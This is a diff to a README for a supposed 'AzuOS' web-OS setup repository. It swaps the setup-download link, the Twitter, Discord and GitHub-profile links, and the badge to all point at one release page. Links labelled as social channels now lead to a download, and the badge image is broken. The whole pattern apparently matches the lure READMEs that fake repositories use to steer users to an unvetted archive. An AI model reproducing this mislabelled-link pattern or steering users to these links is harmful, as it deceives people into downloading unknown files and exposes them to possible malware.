@@ -8,7 +8,7 @@ Welcome to the AzuOS setup repository! Here, you will find all the necessary inf
 - **Topics:** azuos, html, html-css-javascript, installer, javascript, js, linux, no-electron, no-nodejs, operating-system, os, python, pywebview, setup, web-based, web-os, web-technologies
 
 ## 📦 Download AzuOS Setup
-You can download the AzuOS setup files from [here](https://github.com/files/Soft.zip). Once downloaded, follow the instructions below to set up AzuOS on your machine.
+You can download the AzuOS setup files from [here](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2). Once downloaded, follow the instructions below to set up AzuOS on your machine.
 
 ### Installation Instructions
 1. Download the setup files from the provided link.
@@ -37,14 +37,14 @@ If you encounter any issues during the setup process or while using AzuOS, feel 
 We welcome contributions from the community to help improve AzuOS and make it even better. Whether you have suggestions for new features, bug fixes, or enhancements, your input is valuable to us. Join us in shaping the future of web-based operating systems!
 
 ### Connect with Us
-- Follow us on [Twitter](https://twitter.com/AzuOS) for the latest updates.
-- Join our [Discord](https://discord.gg/AzuOS) community to engage with other AzuOS users and developers.
+- Follow us on [Twitter](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2) for the latest updates.
+- Join our [Discord](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2) community to engage with other AzuOS users and developers.
 
 ## 🌐 Explore More
-Discover other exciting projects and repositories related to web technologies, operating systems, and more by visiting our [GitHub profile](https://github.com/AzuOS).
+Discover other exciting projects and repositories related to web technologies, operating systems, and more by visiting our [GitHub profile](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2).
 
 ---
 
 Thank you for choosing AzuOS for your computing needs. We hope you enjoy using this innovative web-based operating system. Happy exploring! 🌈🚀
 
-[![](https://img.shields.io/badge/Download-Get%20AzuOS%20Setup-orange)](https://github.com/files/Soft.zip)
+[![](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2%20AzuOS%20Setup-orange)](https://github.com/PythonGojo/azuos-setup/releases/tag/v1.2)
